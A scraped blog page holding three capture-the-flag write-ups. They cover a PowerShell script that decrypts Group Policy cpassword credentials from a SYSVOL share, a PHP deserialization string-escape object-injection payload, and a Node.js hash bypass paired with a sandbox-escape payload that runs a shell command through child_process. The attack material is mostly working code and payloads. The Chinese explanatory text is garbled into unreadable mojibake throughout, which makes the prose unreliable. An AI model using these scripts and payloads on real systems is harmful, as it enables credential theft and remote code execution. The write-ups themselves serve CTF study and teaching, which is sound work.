<h3 id="SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç "><a href="#SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç " class="headerlink" title="SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç "></a>SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç </h3><p>å‚è€ƒ3gstudentçš„-<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">åŸŸæ¸—é€â€”â€”åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç </a>ã€‚</p>
<p>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„ï¼š</p>
<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>è¿™é‡Œçš„åŸŸå¯ä»¥åœ¨ipconfig /allä¸‹çœ‹åˆ°ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507022504.png" alt="20200507022504"></p>
<p>ç›´æ¥è®¿é—®å¦‚ä¸‹åœ°å€</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507022747.png" alt="20200507022747"></p>
<p>æ‰¾åˆ°å¯¹åº”çš„ç­–ç•¥ç»„idé…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹çš„Group.xml</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/Policies/{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}/Machine/Preferences/Groups/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507023026.png" alt="20200507023026"></p>
<p>ç®€å•çš„æ¥è¯´å°±æ˜¯ï¼š<code>\SYSVOL</code>è·¯å¾„ä¸­ä¿å­˜äº†åŸŸå†…ç”¨æˆ·çš„ä¸€äº›é…ç½®ä¿¡æ¯-&gt;æ‰¾åˆ°<code>HintZip_Pass</code>ç”¨æˆ·çš„é…ç½®ä¿¡æ¯-&gt;ç„¶åæ‰¾åˆ°AES256åŠ å¯†çš„å¯†é’¥ï¼Œç”±äºå¾®è½¯å·²ç»å…¬å¼€äº†ç§é’¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠè¿™ä¸ªç™»å½•å¯†é’¥è¿˜åŸå‡ºæ¥-&gt;æœ€åè§£å‡ºå‹ç¼©åŒ…ã€‚ä¸‹é¢çš„cpasswdå°±æ˜¯åŠ å¯†çš„ç§˜é’¥</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032239.png" alt="20200507032239"></p>
<h3 id="è§£å¯†è„šæœ¬"><a href="#è§£å¯†è„šæœ¬" class="headerlink" title="è§£å¯†è„šæœ¬"></a>è§£å¯†è„šæœ¬</h3><pre><code class="powershell">function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)

        switch ($Mod) {
        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        }


        $Base64Decoded = [Convert]::FromBase64String($Cpassword)

        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 

    catch {Write-Error $Error[0]}
}  
Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code></pre>
<p>æ‰§è¡Œï¼š</p>
<pre><code>powershell -executionpolicy bypass -file 1.ps1</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507032803.png" alt="20200507032803"></p>
<p>å‹ç¼©åŒ…çš„å¯†ç æ˜¯ï¼š<code>zL1PpP@sSwO3d</code></p>
<p>å¾—åˆ°flag:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032939.png" alt="20200507032939"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d61b44424b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d61b44424b.html" class="post-title-link" itemprop="url">2020å®‰æ’4æœˆæœˆèµ›web1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-27 16:51:38" itemprop="dateCreated datePublished" datetime="2020-04-27T16:51:38+08:00">2020-04-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:48:04" itemprop="dateModified" datetime="2020-10-14T17:48:04+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>3.8k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>3 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="2020å®‰æ’4æœˆæœˆèµ›web1-å­—ç¬¦ä¸²é€ƒé€¸å¯¼è‡´å¯¹è±¡æ³¨å…¥"><a href="#2020å®‰æ’4æœˆæœˆèµ›web1-å­—ç¬¦ä¸²é€ƒé€¸å¯¼è‡´å¯¹è±¡æ³¨å…¥" class="headerlink" title="2020å®‰æ’4æœˆæœˆèµ›web1-å­—ç¬¦ä¸²é€ƒé€¸å¯¼è‡´å¯¹è±¡æ³¨å…¥"></a>2020å®‰æ’4æœˆæœˆèµ›web1-å­—ç¬¦ä¸²é€ƒé€¸å¯¼è‡´å¯¹è±¡æ³¨å…¥</h2><p>é¦–å…ˆçœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="php">&lt;?php
$a=&#39;a:2:{i:0;s:6:&quot;tr1ple&quot;;i:1;s:5:&quot;aaaaa&quot;;}i:1;s:5:&quot;aaaaa&quot;;&#39;;
var_dump(unserialize($a));</code></pre>
<p>è¿è¡Œä¹‹åä¼šå‘ç°ä»¥ä¸‹å‡ ç‚¹:</p>
<ul>
<li>å®ƒèƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–</li>
<li>ä¸å­˜åœ¨çš„å±æ€§ä»–ä¹Ÿèƒ½ååºåˆ—åŒ–</li>
</ul>
<p>å…¶å®è¿™ä¸ªå’ŒPHPååºåˆ—åŒ–çš„ç‰¹æ€§æœ‰å…³ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–æ—¶å€™ä»¥åˆ†å·<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ç¬¦ï¼Œä»¥<code>}</code>ä½œä¸ºç»“æŸã€‚è¿™ä¹Ÿå°±æ˜¯è§£é‡Šäº†ä¸Šé¢çš„åºåˆ—åŒ–å€¼ä¸ºä»€ä¹ˆèƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–ï¼Œå› ä¸º<code>}</code>ä½œä¸ºäº†ç»“æŸç¬¦ã€‚</li>
<li>ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§äº¦èƒ½ååºåˆ—åŒ–</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427170935.png" alt="20200427170935"></p>
<p>æˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="php">&lt;?php
function filter($string){
  $a = str_replace(&#39;x&#39;,&#39;zz&#39;,$string);
   return $a;
}
$username = &#39;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&#39;; 
$password=&quot;aaaaa&quot;;
$user = array($username, $password);
echo serialize($user);
echo &quot;\n&quot;;
$r = filter(serialize($user));
echo($r);
echo &quot;\n&quot;;

var_dump(unserialize($r));</code></pre>
<p>$useråœ¨åºåˆ—åŒ–åä¼šæ˜¯:</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°ç¬¬äºŒä¸ªå…ƒç´ è¢«è§£æç§°ä¸ºaaaa,è€Œ<code>;i:1;s:6:&quot;123456&quot;;</code>è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†äº†ã€‚</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>å¯ä»¥è§‚å¯Ÿåˆ°xè¢«æ›¿æ¢ç§°ä¸ºä¸¤ä¸ªz,å…¶é•¿åº¦æ­£å¥½æ˜¯<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> çš„1å€ï¼Œä¹Ÿå°±æ˜¯å››åã€‚</p>
<p>ä½†æ˜¯ä¸ºä»€ä¹ˆå®ƒä¼šå¿½ç•¥<code>&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code> å‘¢ï¼Ÿå› ä¸ºPHPåœ¨ååºåˆ—åŒ–æ—¶å€™æ˜¯ä¸ä»…ä»…æ˜¯æ ¹æ®<code>}</code> æ¥åˆ¤å®šååºåˆ—åŒ–å—çš„èŒƒå›´ï¼Œè¿˜æ˜¯æ ¹æ®æ€»å­—ç¬¦çš„é•¿åº¦ï¼ŒåŸæ¥çš„é•¿åº¦æ˜¯80æˆ‘ä»¬åœ¨åŠ ä¸Š20ä¸ªå­—ç¬¦ä¹‹åæ­£å¥½å°†åé¢çš„ç»™è¦†ç›–æ‰äº†ã€‚äºæ˜¯ä»–åªååºåˆ—åŒ–äº†å‰é¢çš„éƒ¨åˆ†ã€‚</p>
<p>æˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¾‹å­ï¼Œç»“æœå´åˆšå¥½å’Œä¸Šé¢çš„ç»“æœç›¸åï¼š</p>
<pre><code class="php">&lt;?php
$r = &#39;a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&#39;;
 $r = str_replace(&#39;zzzzzzz&#39;, chr(0).&#39;*&#39;.chr(0), $r);
 echo $r;
var_dump(unserialize($r));</code></pre>
<p>ä¸Šé¢ä»£ç æ›¿æ¢ä¼šå‡å°‘ä¸€åŠå¯¼è‡´:<code>;i:1;s:6:&quot;123456&quot;;}&quot;</code> è¢«åæ‰å¯¼è‡´æœ€åç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427205958.png" alt="20200427205958"></p>
<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><pre><code class="php"> &lt;?php
show_source(&quot;index.php&quot;);
function write($data) {
    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
}

function read($data) {
    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = &#39;gqy&#39;;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}

$a = new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);
//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ
$b = unserialize(read(write(serialize($a)))); </code></pre>
<p>è¿™é“é¢˜å’Œä¸Šé¢çš„é“ç†ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘ä»¬æ— éœ€è€ƒè™‘<code>ç±»A</code> åªéœ€è¦è€ƒè™‘Bå’ŒCã€‚</p>
<p>æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„ç»“æœï¼š</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre>
<p>æˆ‘ä»¬çœ‹æˆ‘ä»¬è¦åæ‰çš„å†…å®¹æ˜æ˜¾æ˜¯<code>;s:8:&quot;password&quot;</code> è¿™ä¸€å—ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code> æ‹¼æ¥èµ·æ¥æˆè¿™æ ·ï¼š</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:72:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>ä½†æ˜¯è¿™æ ·æ˜¯æ— æ³•getflagçš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„payloadè¢«<code>&quot;</code> åŒ…è£¹æ‰€ä»¥æˆ‘ä»¬è¦æ·»åŠ ä¸€ä¸ªåŒå¼•å·è¿›è¡Œé€ƒé€¸ã€‚</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬éœ€è¦åå¹¶æ‰çš„å°±æ˜¯<code>;s:8:&quot;password&quot;;s:73:&quot;&quot;</code> ,ä½†æ˜¯è¿™ä¸ªé•¿åº¦å®23æ²¡æ³•æ•´é™¤2ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªå­—ç¬¦åŠ èµ·æ¥24.</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆä¼šæ„æˆä¸€ä¸ªè¿™æ ·çš„åºåˆ—åŒ–å­—ç¬¦å—ï¼š</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:74:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}</code></pre>
<p>å› ä¸ºéœ€è¦é€ƒé€¸24ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦48ä¸ªé•¿åº¦çš„<code>\0</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5efc80b37.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5efc80b37.html" class="post-title-link" itemprop="url">NPUCTF2020 éªŒè¯ğŸ-ï¼ˆå¼±ç±»å‹æ¯”è¾ƒã€hashç»•è¿‡ã€æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç ï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-25 00:47:35" itemprop="dateCreated datePublished" datetime="2020-04-25T00:47:35+08:00">2020-04-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:28:23" itemprop="dateModified" datetime="2020-10-14T17:28:23+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>4.1k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>4 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li>æˆ‘ä»¬ç”¨ä¸€æ®µä»£ç æ¥çœ‹å†JavaScriptä¸­çš„ç±»å‹æ¯”è¾ƒï¼š</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424150332.png" alt="20200424150332"></p>
<ul>
<li><p>å¯ä»¥çœ‹åˆ°æ•°ç»„<code>[1]==1</code>åœ¨ä¸¤ä¸ªç­‰äºå·æ—¶å€™æ˜¯è¿”å›trueçš„ï¼Œè€Œåœ¨ä¸‰ä¸ªç­‰äºå·æ—¶å€™ä¼šè¿”å›falseã€‚è¿™ä¸€ç‚¹æ˜¯å’Œphpä¸€æ ·çš„ã€‚</p>
</li>
<li><p>è€Œåœ¨JavaScriptä¸­å„ä¸ªæ•°æ®ç±»å‹çš„ç›¸åŠ å‘¢ï¼Ÿ</p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424162607.png" alt="20200424162607"></p>
<p>å¯ä»¥çœ‹åˆ°å¯¹è±¡å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„æ˜¯å­—ç¬¦ä¸²ã€‚è€Œæ•°ç»„å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åä¹Ÿæ˜¯å¾—åˆ°å­—ç¬¦ä¸²ã€‚æ‰€ä»¥å¯ä»¥åŸºæœ¬å¾—å‡ºç»“è®ºå°±æ˜¯ï¼Œ<strong>nodeä¸­ä»»ä½•æ•°æ®ç±»å‹å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„éƒ½æ˜¯å­—ç¬¦ä¸²</strong>ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424180609.png" alt="20200424180609"></p>
<p>è€Œé•¿åº¦<code>length</code> å±æ€§å¯¹äºå­—ç¬¦ä¸²æ˜¯è¿”å›å­—ç¬¦ä¸²é•¿åº¦ï¼Œè€Œæ•°ç»„æ˜¯è¿”å›æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è€Œæ•°å­—æ˜¯æ²¡æœ‰<code>length</code> çš„ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424215524.png" alt="20200424215524"></p>
<h2 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a>[NPUCTF2020]éªŒè¯ğŸ</h2><pre><code class="javascript">app.post(&#39;/&#39;, function (req, res) {
  let result = &#39;&#39;;
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
      } catch (e) {
        console.log(e);
        result = &#39;Wrong Wrong Wrong!!!&#39;;
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift(&#39;Not verified!&#39;);
  }
  if (results.length &gt; 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});</code></pre>
<p>ä»¥è¿™é“é¢˜ä¸ºä¾‹:</p>
<h3 id="hashç»•è¿‡"><a href="#hashç»•è¿‡" class="headerlink" title="hashç»•è¿‡"></a>hashç»•è¿‡</h3><p>è¦æ»¡è¶³<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> ç»“åˆä¸Šé¢çš„ç»“è®ºæˆ‘ä»¬æˆ‘ä»¬æƒ³è¦<code>first</code> å’Œ<code>second</code> é•¿åº¦ä¸€æ ·è€Œä»–ä»¬å†…å®¹åˆä¸ç›¸ç­‰ï¼Œä½†æ˜¯ä»–ä»¬md5åŠ ç›åçš„å€¼åˆè¦ç›¸ç­‰ã€‚å¯ä»¥æ„é€ å¦‚ä¸‹payloadï¼š</p>
<pre><code>{&quot;e&quot;:paylod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}</code></pre><p>è¿™æ˜¯å› ä¸ºæ•°ç»„åˆ©ç”¨äº†<strong>ä»»ä½•æ•°æ®ç±»å‹åŠ ä¸Šå­—ç¬¦ä¸²éƒ½ä¼šè½¬å˜ç§°ä¸ºå­—ç¬¦ä¸²çš„ç‰¹æ€§</strong>ã€‚åŒæ—¶æ•°ç»„å’Œå­—ç¬¦ä¸²çš„é•¿åº¦éƒ½æ˜¯1ä½†æ˜¯ä»–ä»¬å´ä¸å…¨ç­‰ã€‚</p>
<pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://ff8efecb-b1bc-4df1-af3d-249b285a0c54.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;paylod&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>è¿™é“é¢˜çš„ç¬¬äºŒå…³æˆ‘ä¸€ç›´æ²¡åšå‡ºæ¥,è™½ç„¶çœ‹æ­£åˆ™å°±çŸ¥é“æ˜¯ç”¨mathå»RCEã€‚</p>
<h3 id="æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç "><a href="#æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç " class="headerlink" title="æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç "></a>æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç </h3><p>é¢˜ç›®å…³é”®ä»£ç ï¼š</p>
<pre><code class="javascript">function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
    return null;
  }
  return eval(str);
}</code></pre>
<p>ä»æ­£åˆ™å¯ä»¥çœ‹å‡ºåªèƒ½åµŒå¥—Mathè€Œä¸”Mathåªèƒ½ç”¨ä¸€ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯åªèƒ½ç”¨ä¸€å±‚å±æ€§ã€‚</p>
<p>æˆ‘ä»¬å†æ¥çœ‹æœ€ç»ˆçš„payload:</p>
<pre><code class="javascript">(Math=&gt;(
    Math=Math.constructor,
    Math.x=Math.constructor(
        Math.fromCharCode(
114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
        )()))(Math+1)</code></pre>
<p><code>Math=&gt;</code> æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231655.png" alt="20200424231655"></p>
<p>å¯ä»¥å‘ç°æœ€ç»ˆæ˜¯ç”Ÿæˆäº†ä¸ªå‡½æ•°ã€‚æ˜¯çš„è¿™å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„åŒ¿åå‡½æ•°ã€‚<code>x =&gt; x * x</code> ç›¸å½“äºï¼š</p>
<pre><code class="javascript">function (x) {
    return x * x;
}</code></pre>
<p>åŒç†<code>a = x=&gt;x*x</code> ç›¸å½“äºå‘½åäº†ä¸€ä¸ªåå­—ä¸ºaçš„å‡½æ•°ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231946.png" alt="20200424231946"></p>
<p>é‚£ä¹ˆ<code>(x=&gt;x+x)(2)</code>å‘¢å…¶å®å°±ç›¸å½“äºå¾€è¿™ä¸ªå‡½æ•°é‡Œé¢ä¼ å…¥å‚æ•°2ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424235002.png" alt="20200424235002"></p>
